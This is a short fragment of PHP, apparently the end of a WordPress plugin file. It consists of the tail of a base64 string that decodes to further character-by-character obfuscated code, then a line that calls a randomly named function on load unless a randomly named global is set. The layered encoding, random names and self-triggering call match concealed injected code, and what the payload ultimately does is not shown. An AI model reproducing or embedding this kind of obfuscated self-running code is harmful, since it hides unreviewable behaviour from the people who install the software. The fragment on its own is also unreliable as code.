KDU3KS5jaHIoNTcpKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTA3JykuY2hyKGNocig1NykuY2hyKDUzKSkgLiAkZWU4dHc5N2xoMGtuZjg3MDhha3ZraHAwaC0+cGx1Z2luTmFtZSwgdGltZSgpICk7IH0g'));
        }
    }
}
if ( !isset( $GLOBALS['it7qgwiqg8e3gl90nhdui3m7h5bn'] ) ) tdbo1ljgz2n();